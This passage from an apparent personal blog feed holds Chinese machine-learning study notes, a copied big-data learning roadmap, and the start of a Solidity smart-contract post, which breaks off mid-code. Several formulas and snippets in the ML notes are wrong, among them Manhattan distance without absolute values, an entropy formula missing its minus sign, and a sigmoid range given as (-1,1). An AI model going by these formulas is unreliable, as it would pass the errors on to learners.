      <url>/2020/09/11/2020-09-12-statics_note/</url>
      
        <content type="html"><![CDATA[<p>该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼</p><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="生成模型与判别模型"><a href="#生成模型与判别模型" class="headerlink" title="生成模型与判别模型"></a>生成模型与判别模型</h3><p>generative model和discriminative model$（以下分别表示为G和D）$<br>$G\ $常见的有朴素贝叶斯，隐马尔科夫模型，高斯混合、 LDA、 Restricted Boltzmann Machine等<br>$D\ $有Kmeans，感知机，决策树，最大熵模型，Logistic回归、SVM、 boosting、条件随机场、神经网络等<br>两者的本质区别及特点：<br>$G\ $的流程是<strong>学习X和Y的联合概率分布$P(x,y)$得出$P(y|x)$最直接的例子就是Naive Bayes</strong>，由于生成的结果是联合分布$P(x,y)$，可以计算边缘分布$P(x)$进行异常值检测，若$P(x)$太小，就判定可能不适合这一类样本所代表的数据。<br>$D\ $的流程是<strong>直接由给定的X，Y学习决策函数或$P(y|x)$，是一种黑盒操作，准确率高，可以将允许对问题进行抽象处理，最熟悉的例子就是Neural Network</strong></p><h3 id="分类问题和回归问题"><a href="#分类问题和回归问题" class="headerlink" title="分类问题和回归问题"></a>分类问题和回归问题</h3><p>分类用CrossEntropy，回归用Mean Square Error等等</p><h3 id="范数-norm"><a href="#范数-norm" class="headerlink" title="范数 norm"></a>范数 norm</h3><p>$L1范数 \sum{|x_i|}$<br>$L2范数 \sqrt{x_{1}^{2} + x_{2}^{2} + … + x_{n}^{2}}$<br>$L_\infty无穷范数MAX{|x_i|}$<br>范数理论推论$L1\geq{L2\geq{L_\infty}}$<br>对于numpy的线性代数库，有几种求范数的方法，主要就是求这三种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linalg.norm(x, ord=<span class="literal">None</span>, axis=<span class="literal">None</span>, keepdims=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>axis=0表示对矩阵x的每一列求范数，axis=1表示对矩阵的每一行求范数， keeptdims=True表示结果保留维度，keepdims=False表示结果不保留维度</p><h3 id="最小二乘"><a href="#最小二乘" class="headerlink" title="最小二乘"></a>最小二乘</h3><p>是解决曲线拟合问题、最小化cost的优化方法，使求得的数据与实际数据之间的误差平方和最小，应用范围非常广泛。<br>$设(x,y)为一组观测量，x=[x_0,x_1,…,x_n]^T,寻找一个函数y=f(x,w)$ ，使$尽可能逼近曲线(x,y),其中w=[w_0,w_1,…,w_n]^T$，为待估计参数，求解<br>使残差函数$$L(y,f(x,w))=\sum{[y_i-f(x_i,w_i)]^2}$$得到<strong>全局</strong>最小值的$w$,直观上就是每个点与拟合曲线的欧氏距离的平方和。</p><p><em>与梯度下降的区别：</em><br>最小二乘法是指对$\Delta$求导找出函数全局最小的w，梯度下降是先给定一个w（初始化），经过N次梯度下降后找到的使函数局部最小的w。相对的，梯度下降适用于大规模数据，最小二乘适用于较小样本，不过梯度下降的缺点是到最小点的时候收敛速度变、对初始点的选择极为敏感两个方面。</p><h2 id="感知机-perceptron"><a href="#感知机-perceptron" class="headerlink" title="感知机 perceptron"></a>感知机 perceptron</h2><p>属于$Discriminative \ Model$的线性分类模型，输入是表示一个Instance的特征向量，求出分离特征的超平面，公式表示为：<br>$f(x) = sign(w*x+b)$<br>$\begin{eqnarray}<br>sign(x)=  \begin{cases}<br>1,&amp;x\geq{0}  \cr<br>-1 ,&amp;x&lt;0<br>\end{cases}<br>\end{eqnarray}$<br>这种perceptron叠起来就相当于是全连接的MLP(Multi-Layer Perceptron)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/MLP.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><p>n多个线性函数叠加，对应矩阵运算$W\cdot x + B$，$W是w权重矩阵，B是bias的列向量，激活函数对应单个感知机的sign函数$</p><h2 id="k-近邻-k-nearest-neighbor"><a href="#k-近邻-k-nearest-neighbor" class="headerlink" title="k-近邻 k nearest neighbor"></a>k-近邻 k nearest neighbor</h2><p>还是属于$Discriminative \ Model$的模型，复杂度为$O(n^2)$，由三个基本要素组成：<strong>距离度量、k值、分类规则</strong><br>距离度量，设有向量x1和x2，则：<br>欧氏距离<code>np.sqrt(np.sum(np.square(x1 - x2)))</code><br>或直接<code>np.linalg.norm(x1-x2)</code>（用numpy的线性代数库求L2范数，但后者较慢）<br>曼哈顿距离<code>np.sum(x1 - x2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">input:px,k</span><br><span class="line"><span class="keyword">return</span>:bestx</span><br><span class="line"><span class="comment"># get N(x):涵盖最近的k个点的邻域，即KList</span></span><br><span class="line">distList = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> X:</span><br><span class="line">distList.append(np.sqrt(np.sum(np.square(px - x))))</span><br><span class="line">KList = np.argsort(np.array(distList))[:k]</span><br><span class="line"><span class="comment"># 决策规则I:由KList得出bestx，以类别分类问题为例，选N(x)最多类别为结果</span></span><br><span class="line">X(np.argmax(np.bincount(X(i))))</span><br></pre></td></tr></table></figure><p>如果要求多个最大值索引<br><code>np.where(a == np.amax(a))[0]</code>，或者<code>np.argwhere(a == np.amax(a))</code></p><h3 id="kd-tree"><a href="#kd-tree" class="headerlink" title="kd tree"></a>kd tree</h3><p>存储k维空间数据的树结构，实现如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="朴素贝叶斯-Naive-Bayes"><a href="#朴素贝叶斯-Naive-Bayes" class="headerlink" title="朴素贝叶斯 Naive Bayes"></a>朴素贝叶斯 Naive Bayes</h2><p>属于$Generative \ Model$一类，给的是联合分布$P(x,y)$，学过概率论的应该都会，普通的算法实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">input:</span><br><span class="line">先验概率分布P__y : P(Y=c)，条件概率分布P_x_y : P(X=x|Y=c)，dim_f:特征维度</span><br><span class="line">c_num：分类数目，data:数据list，label:标签list，以[<span class="number">0</span>,<span class="number">1</span>,...,<span class="number">9</span>]为例</span><br><span class="line"><span class="keyword">return</span>:max P</span><br><span class="line"></span><br><span class="line"><span class="comment">#求出先验分布，并对数化，经常使用的对乘法处理的方式</span></span><br><span class="line">P__y = [[(np.sum(label == np.asarray(i)))/(len(label))] \</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num)]</span><br><span class="line">P__y = np.log(P__y)</span><br><span class="line"><span class="comment">#求出条件分布</span></span><br><span class="line">P_x_y = np.zeros((c_num, dim_f, <span class="number">2</span>))  </span><br><span class="line"><span class="comment">#对标记集进行遍历  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(label)):  </span><br><span class="line">    <span class="comment">#获取当前循环所使用的标记  </span></span><br><span class="line">c = label[i]  </span><br><span class="line">    <span class="comment">#获取当前要处理的样本</span></span><br><span class="line">x = data[i]  </span><br><span class="line">    <span class="comment">#对该样本的每一维feature进行遍历</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">        <span class="comment">#先在矩阵中对应位置加1</span></span><br><span class="line">P_x_y[c][j][x[j]] += <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):  </span><br><span class="line">P_x_y0 = P_x_y[c][j][<span class="number">0</span>]  </span><br><span class="line">P_x_y1 = P_x_y[c][j][<span class="number">1</span>]  </span><br><span class="line">P_x_y[c][j][<span class="number">0</span>] = np.log((P_x_y0 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line">P_x_y[c][j][<span class="number">1</span>] = np.log((P_x_y1 + <span class="number">1</span>) / (P_x_y0 + P_x_y1 + <span class="number">2</span>))</span><br><span class="line"><span class="comment"># pick up最大Probability</span></span><br><span class="line">P = [<span class="number">0</span>] * c_num</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(c_num):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(dim_f):</span><br><span class="line">sum += P_x_y[i][j][x[j]]  </span><br><span class="line">P[i] = sum + P__y[i] </span><br><span class="line">res = P.index(np.amax(P))</span><br></pre></td></tr></table></figure><h2 id="决策树-Decision-Tree-及剪枝"><a href="#决策树-Decision-Tree-及剪枝" class="headerlink" title="决策树 Decision Tree 及剪枝"></a>决策树 Decision Tree 及剪枝</h2><p>决策树是经常在kaggle以及实际应用中很广泛且有效的算法，决策树通常包括3个步骤:<strong>特征选择、构造、剪枝</strong>，<del>无内鬼，直接进行一个sklearn.tree的import</del>，sklearn的tree里封装了BaseDecisionTree，在此基础上进一步封装了DecisionTreeClassifier和DecisionTreeRegressor：分类器和回归器，做kaggle是确实好用。</p><h3 id="特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。"><a href="#特征选择：特征选择的准则是信息增益（information-gain）或信息增益比。" class="headerlink" title="特征选择：特征选择的准则是信息增益（information gain）或信息增益比。"></a>特征选择：特征选择的准则是信息增益（information gain）或信息增益比。</h3><p>$设离散型X的概率分布P(X =x_i)=p_i$<br>$Entropy的定义为H(X)=\sum{p_i\log{p_i}}$</p><h3 id="决策树构造"><a href="#决策树构造" class="headerlink" title="决策树构造"></a>决策树构造</h3><h4 id="ID3"><a href="#ID3" class="headerlink" title="ID3"></a>ID3</h4><p>各个节点用信息增益H(D)准则选择特征，递归构建决策树。<br>ID3算法的核心是在决策树各个结点上用<strong>信息增益</strong>选择特征，递归地构建决策<br>树。具体方法是：从根结点（root node）开始，对结点计算所有可能的特征的信息增益， 选择信息增益最大的特征作为结点的特征，由该特征的不同取值建立子结点；再对子结点递归调用该方法，直到所有feature被用完或剩余feature的信息增益很小或少于自己设置的阈值，决策树建立完成，缺点是只生成了树，没有【】容易过拟合。</p><h4 id="C4-5"><a href="#C4-5" class="headerlink" title="C4.5"></a>C4.5</h4><p>各个节点用<strong>信息增益比</strong>选择特征，递归构建决策树，递归函数流程和ID3一样，只是评估标准换成了H(D|A)</p><h4 id="CART"><a href="#CART" class="headerlink" title="CART"></a>CART</h4><p>对回归树用<strong>平方最小误差</strong>原则，对分类树用<strong>基尼指数最小化</strong>原则进行特征选择。</p><h3 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h3><p>去掉过于细分的叶结点，使其回退到父结点，甚至更高的结点，然后将父结点或更高的结点改为新的叶结点。</p><p>但是自己还是得从0实现一个决策树，以后用的时候心里有点B数。<br>数据用colab的sampledata里california_housing那个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h2><p>熟悉的Logistic回归，以二分类任务为例，就是用sigmoid函数把结果映射到(-1,1)；多分类任务下，将该二分类任务的sigmoid推广到了softmax函数    ，就是我们熟悉的softmax激活函数。<br>$$Sigmoid(z) = \frac{1}{1+exp(-z)},z=w^T\cdot x,(alias\ Sigmoid(z)=h_w(x))$$<br>$$gradient\ descent:<br>\Delta = x_i \cdot y_i - \frac{np.exp(w\cdot x_i) * x_i)}{ ( 1 + np.exp(w\cdot x_i))}then, \ w=w+lr\cdot\Delta$$<br>或者<br>$$LikelihoodFunc:J(w) =-\frac{1}{m}\sum\limits_{i=1}^{m}{[y_ilog(h_w(x_i))+(1-y_i)log(1-h_w(x_i))]}$$</p><p>$$partial:\frac{\partial J\left(w \right)}{\partial {w}}=\frac{1}{m}\sum\limits_{i=1}^{m}{(h_w(x_i)-{y_i})x_i}$$<br>代码例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gradient descent</span></span><br><span class="line">x = data <span class="comment"># feature array,default(n,m), gradient dimension is m</span></span><br><span class="line">y = label <span class="comment"># result/ ground truth</span></span><br><span class="line">w = np.zeros(x.shape[<span class="number">1</span>])</span><br><span class="line">iter_num = <span class="number">1000</span></span><br><span class="line">lr = <span class="number">1e-4</span></span><br><span class="line"><span class="keyword">for</span> one_iter <span class="keyword">in</span> range(iter_num):</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> len(data):</span><br><span class="line"><span class="comment"># 下面xiyi赋值是看着方便，实际上用的时候直接用index取list元素</span></span><br><span class="line">x_i = data[index]</span><br><span class="line">y_i = label[index]</span><br><span class="line"><span class="comment"># 用上面的公式，求partial</span></span><br><span class="line">gradient = x_i*(<span class="number">1</span>/(<span class="number">1</span>+np.exp(np.dot(w,x_i)))-y_i)</span><br><span class="line">w+=gradient*lr</span><br><span class="line">print(<span class="string">"final w:"</span>,w)</span><br></pre></td></tr></table></figure><h2 id="最大熵模型-Max-Entropy-Model"><a href="#最大熵模型-Max-Entropy-Model" class="headerlink" title="最大熵模型 Max Entropy Model"></a>最大熵模型 Max Entropy Model</h2><p><del>复杂度超高，做分类慢的一批</del>，一般用来衡量预测效果的好坏，<del>其实一般也不用</del>。主要是记录一下最大熵模型的思想：将分类等问题作为约束最优化问题，下面的SVM和Adaboost等算法都是采用的约束最优化思想完成的。</p><h2 id="支持向量机-Support-Vector-Machines"><a href="#支持向量机-Support-Vector-Machines" class="headerlink" title="支持向量机 Support Vector Machines"></a>支持向量机 Support Vector Machines</h2><p>间隔最大化的学习策略，可形式化为求解<strong>凸二次规划</strong>问题/正则化的合页损失函数的最小化问题<br>训练数据线性可分，通过硬间隔最大化（hard margin maximization）学习<em>线性可分SVM/硬间隔SVM</em><br>数据近似线性可分，通过软间隔最大化（soft margin maximization）学习<em>线性SVM/软间隔SVM</em><br>数据线性不可分时，通过核函数+软间隔最大化，学习<em>非线性SVM</em>：核函数表示将输入从输入空间映射到特征空间得到的特征向量的内积(点乘)，可以抽象成在高维空间里学习一个线性SVM</p><h3 id="线性SVM"><a href="#线性SVM" class="headerlink" title="线性SVM"></a>线性SVM</h3><p>函数间隔、约束最优化问题</p><ul><li>函数间隔：对于给定数据和超平面wx+b：<br>关于样本点(x,y)的函数间隔为$\gamma_f=y(wx+b)$<br>关于数据集的函数间隔为，所有样本点的最小值，$\gamma_{min}=min(\gamma_f)$</li><li>几何间隔：归一化函数间隔，在法向量正向的几何间隔为$\gamma_g=y(\frac{w}{||w||}\cdot{x}+\frac{b}{||w||}),其中||w||是法向量w的L_2范数$<br>两者关系是$\gamma_f=\gamma_g*||w||$</li><li>间隔最大化，我们为使SVM分类样本点的置信度更大，需要将超平面关于数据集的几何间隔最大化，即求<em>最大几何间隔的超平面</em>，数学描述为：<br>$$max\ \frac{\gamma_f}{||w||}\\ s.t.\ y(wx+b)\geq \gamma_{min}$$<br>由于等式两边在尺度上是一致的，用一下无敌的“不妨设”$\gamma_f = 1$，那么优化目标为w的L2范数的最小值，即<br>$$max\ \frac{\gamma_f}{||w||}等价于求\min{\frac{||w||^2}{2}}\\ s.t.\ y(wx+b)\geq{1}$$<br>那么这个转化为二次规划的非线性规划如何求解呢？<br>使用<strong>拉格朗日对偶性</strong>求解对偶问题得到以上问题的解，以这个线性可分问题为例，引入N个拉格朗日乘子，$\alpha$，对应N维特征和N维法向量w：<br>$$构建拉格朗日函数L(w,b,\alpha)=\frac{||w||^2}{2}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i}$$<br>原始问题的对偶问题转化为$\max\limits_{\alpha}\min\limits_{w,b}L,下面推导一下$<br>Derivatives:<br>$$\frac{\partial{L(w,b,\alpha)}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\ \frac{\partial{L(w,b,\alpha)}}{\partial{b}}=\sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>Then we turn to:<br>$$max:L(w,b,\alpha)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\ s.t\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$</li></ul><p>这化简为只有拉格朗日乘子alpha的L极大值问题了，到这一步，我们可以直接进行SMO求解（从这里可以直接跳到下一节）<br>于是我们可以引入软间隔的线性SVM，对每个样本点引进一个松弛变量$\xi\geq0$，再引进一个惩罚参数C，那么我们的问题由$求min\frac{||w||^2}{2}转化为min(\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i})$<br>$$L(w,b,\xi,\alpha,\mu)=\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i(1-\xi_i)}-\sum\limits_{i=1}^N{\mu_i\xi_i},\\<br>s.t.\ y(wx+b)\geq1-\xi,\xi\geq0$$<br>Derivatives:<br>$$\frac{\partial{L}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\<br>\frac{\partial{L}}{\partial{b}}=-\sum\limits_{i=1}^N{\alpha_iy_i}=0\\<br>\frac{\partial{L}}{\partial{\xi_i}}=C-\alpha_i-\mu_i=0$$<br>以上求出关于$w,b,\xi$的极小后<br>turn to :<br>$$max:L(w,b,\xi,\alpha,\mu)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0,\\<br>C-\alpha_i-\mu_i=0$$<br>由以上结果可以看出，如果将目标函数的max转化为求min(改正负号)，均得到对应的对偶问题，其满足KKT条件，经过求解对偶问题，得出alpha，带入解得w和b，$$w=\sum\limits_{i=1}^N{\alpha_ix_iy_i}\\<br>b=y_j-\sum\limits_{i=1}^N{}y_i\alpha_i(x_ix_j)$$即得到超平面，<strong>wx+b=0</strong><br>以上两种线性的SVM可以直接由上面的推导将一个求最大间隔的原始问题转化为求一个超平面的对偶问题，进而求得</p><h3 id="非线性SVM"><a href="#非线性SVM" class="headerlink" title="非线性SVM"></a>非线性SVM</h3><p>核函数用来将两个样本点实例$x,z$通过映射函数$\Phi(x),\Phi(z)$从输入空间映射到特征空间内，核函数表示为K，即$K(x,z)=\Phi(x)^T\Phi(z)$，一般不写出映射函数$\Phi$，而是在Kernel函数中隐式给出：<br>在这记录一下高斯核Gaussian kernel(radial basis function,RBF kernel):<br>$$K(x,z)=exp(-\frac{||x-z||^2}{2\sigma^2})$$和sigmoid核：<br>$$K(x,z)=tanh(ax^Tz+c)\\ tanh(b)=\frac{1-e^{-2b}}{1+e^{-2b}}$$<br>“SVM with a sigmoid kernel is equivalent to a 2-layer perceptron”，一个结论，显式的证明就不用写了，其实在看到拉格朗日乘子alpha时，我们就可以直观的联想到拉格朗日乘子相当于感知机场景下对feature的权重。</p><h3 id="序列最小最优化算法，sequential-minimal-optimization-SMO-alg"><a href="#序列最小最优化算法，sequential-minimal-optimization-SMO-alg" class="headerlink" title="序列最小最优化算法，sequential minimal optimization,SMO alg."></a>序列最小最优化算法，sequential minimal optimization,SMO alg.</h3><p>引入核函数的非线性转化为线性（甚至是可分）的凸二次规划问题：<br>$$\min\limits_{\alpha}:\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}-\sum\limits_{i=1}^N{\alpha_i},\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>非线性引入Gaussian核的SVM实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def SVM():</span><br></pre></td></tr></table></figure><h3 id="概念补充"><a href="#概念补充" class="headerlink" title="概念补充"></a>概念补充</h3><p><em>supprot vector</em>:线性不可分情况下，对偶问题的解$\alpha=(a_1,a_2…a_N)^T中a_i对应的样本点(x_i,y_i)就是支持向量。$<br><em>凸优化问题</em>：设$f:F\rightarrow{R}为$凸函数，则求$\min\limits_{x\in{F}}{f(x)}为$凸优化问题<br>凸优化有如下几个定理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">凸优化任意局部最优解即全局最优解</span><br><span class="line">凸优化最优解集为凸集</span><br><span class="line">若函数f为非空凸集上的严格凸函数，且凸优化问题存在全局最优解，那么全局最优解唯一</span><br></pre></td></tr></table></figure><p>在条件$f_i(x)\leq0,1,a_i^T\cdot x = b_i$最小化$f_0(x)$，<br>凸集指一个集合空间内部两点间连线所覆盖的点都在集合空间内，<br>凸二次规划（convex quadratic programming）指目标函数为凸二次函数，形如<br>$$min f(x)= \frac{1}{2}x^TQx+C^Tx,\\<br>s.t.\ Ax\leq{b}，其每一行对应一个约束$$<br><em>Karush-Kuhn-Tucker condition:</em><br>$\alpha_i\geq{0}\\<br>y_i(wx_i+b)\geq{1}\\<br>\alpha_i(y_i(w_ix+b)-1)=0$</p><h2 id="随机森林，梯度提升决策树"><a href="#随机森林，梯度提升决策树" class="headerlink" title="随机森林，梯度提升决策树"></a>随机森林，梯度提升决策树</h2><p>梯度提升决策树（GBDT）对于输入的一个样本实例，首先会赋予一个初值，然后会遍历每一棵决策树，每棵树都会对预测值进行调整修正，最后得到预测的结果</p><p>随机森林减少模型方差，提高性能<br>GBDT减少模型偏差，提高性能</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云计算技术栈学习路线</title>
      <link href="/2020/01/04/2020-01-04-%E4%BA%91%E8%AE%A1%E7%AE%97%E6%8A%80%E6%9C%AF%E6%A0%88/"/>
      <url>/2020/01/04/2020-01-04-%E4%BA%91%E8%AE%A1%E7%AE%97%E6%8A%80%E6%9C%AF%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<p>，忘记从哪复制过来的了，侵删（</p><a id="more"></a><h1 id="Google-三件套"><a href="#Google-三件套" class="headerlink" title="Google 三件套"></a>Google 三件套</h1><p>Hadoop对应于Google三件套<br>HDFS对应于GFS，即分布式文件系统，MapReduce即并行计算框架，HBase对应于BigTable，即分布式NoSQL列数据库，外加Zookeeper对应于Chubby，即分布式锁设施。</p><p>hadoop -&gt;<br>zookeeper -&gt;<br>hive -&gt;<br>flume &amp;&amp; sqoop -&gt;<br>azkaban &amp;&amp; oozie -&gt;<br>数仓建模理论+实践（离线数仓项目） -&gt;<br>hbase -&gt;<br>redis -&gt;<br>kafka -&gt;<br>elk -&gt;<br>scala -&gt;<br>spark -&gt;<br>kylin -&gt;<br>flink -&gt;<br>实时数仓项目</p><p>Scala底层也是使用的JVM虚拟机</p><h1 id="Hadoop（重点）"><a href="#Hadoop（重点）" class="headerlink" title="Hadoop（重点）"></a>Hadoop（重点）</h1><p>学习Hadoop，需要重点掌握Hadoop的三个组件：MapReduce、HDFS、YarnZookeeper（会用，懂原理）</p><h1 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h1><p>意为动物园管理者，是一个分布式应用程序协调框架，负责协调大数据框架的</p><h1 id="Hive（重点）"><a href="#Hive（重点）" class="headerlink" title="Hive（重点）"></a>Hive（重点）</h1><p>Hive底层依赖Hadoop，所以学完Hadoop在学Hive很简单，因为Hive是数仓工具，使用SQL开发的，如果懂SQL语句，那Hive学起来更简单了</p><h1 id="Flume（会用）"><a href="#Flume（会用）" class="headerlink" title="Flume（会用）"></a>Flume（会用）</h1><p>Flume就是一个采集工具，比如把日志实时采集到大数据平台上，用Flume即可</p><h1 id="Sqoop（会用）"><a href="#Sqoop（会用）" class="headerlink" title="Sqoop（会用）"></a>Sqoop（会用）</h1><p>Sqoop也是采集工具，但是和Flume定位不同，Sqoop是hadoop和其他数据库之间移动数据Flume是从各种来源收集数据，例如日志，jms，目录等</p><h1 id="azkaban和oozie（会用）"><a href="#azkaban和oozie（会用）" class="headerlink" title="azkaban和oozie（会用）"></a>azkaban和oozie（会用）</h1><p>这两个框架属于一类，都是资源调度框架，比如每天定时跑一些大数据的任务，就可以在这上面操作，这两个框架区别就是azkaban功能简单，易上手，oozie功能多，上手相对复杂一点</p><h1 id="数仓理论-实践（重点）"><a href="#数仓理论-实践（重点）" class="headerlink" title="数仓理论+实践（重点）"></a>数仓理论+实践（重点）</h1><p>学到这可以做一些项目了，找一些离线数仓的项目做下，做项目的同时需要理解数仓建模的理论，数仓为什么这样建，有什么好处，以后可能会出现什么隐患等，需要重点关注</p><h1 id="HBase（重点）"><a href="#HBase（重点）" class="headerlink" title="HBase（重点）"></a>HBase（重点）</h1><p>HBase是一个分布式列式数据库，适合存储海量的数据，能进行秒级查询，需要重点学习</p><h1 id="Kafka（重点）"><a href="#Kafka（重点）" class="headerlink" title="Kafka（重点）"></a>Kafka（重点）</h1><p>Kafka是大数据消息队列领域唯一的王者，不但工作常用，面试也常问，需要理解底层原理ELK（会用，最好也深入下）</p><h1 id="ELK是三个组件的简称，"><a href="#ELK是三个组件的简称，" class="headerlink" title="ELK是三个组件的简称，"></a>ELK是三个组件的简称，</h1><p>它们是Elasticsearch、Logstash、Kibana，Elasticsearch 是一个基于 Lucene 的、支持全文索引的分布式存储和索引引擎；Logstash是一个日志收集、过滤、转发的中间件；Kibana是一个可视化工具，主要负责查询 Elasticsearch 的数据并以可视化的方式展现给业务方</p><h1 id="Scala（重点）"><a href="#Scala（重点）" class="headerlink" title="Scala（重点）"></a>Scala（重点）</h1><p>前面也说了，这是大数据必学的一门语言，因为Spark和Flink底层都是基于Scala开发的，当然也有部门Java开发的</p><h1 id="Spark（重点）"><a href="#Spark（重点）" class="headerlink" title="Spark（重点）"></a>Spark（重点）</h1><p>Spark 是专为大规模数据处理而设计的快速通用的计算引擎，支持批处理和流处理，目前主要用在批处理领域</p><h1 id="Kylin（会用）"><a href="#Kylin（会用）" class="headerlink" title="Kylin（会用）"></a>Kylin（会用）</h1><p>Kylin的出现就是为了解决大数据系统中TB级别数据的数据分析需求，它提供Hadoop/Spark之上的SQL查询接口及多维分析(OLAP)能力以支持超大规模数据，它能在亚秒内查询巨大的Hive表。其核心是预计算，计算结果存在HBase中</p><h1 id="Flink（重点）"><a href="#Flink（重点）" class="headerlink" title="Flink（重点）"></a>Flink（重点）</h1><p>Flink目前非常火，和Spark一样，支持批处理和流处理，目前主要用在流处理实时数仓项目（重点）</p>]]></content>
      
      
      <categories>
          
          <category> CloudComputing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudComputing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity编写smart contract的demo</title>
      <link href="/2019/07/22/2019-07-22-blockchain/"/>
      <url>/2019/07/22/2019-07-22-blockchain/</url>
      
        <content type="html"><![CDATA[<p>暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)<br>ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是<a href="http://talk.strangeai.pro" target="_blank" rel="noopener">http://talk.strangeai.pro</a><br>（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）</p><a id="more"></a><p><a href="http://ethdoc.cn/" target="_blank" rel="noopener">eth文档</a><br><a href="https://solidity-cn.readthedocs.io" target="_blank" rel="noopener">solidity文档</a></p><h2 id="测试网络Rinkeby"><a href="#测试网络Rinkeby" class="headerlink" title="测试网络Rinkeby"></a>测试网络Rinkeby</h2><p>Rinkeby是以太坊官方提供的测试网络，使用PoA共识机制<br>PoA流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 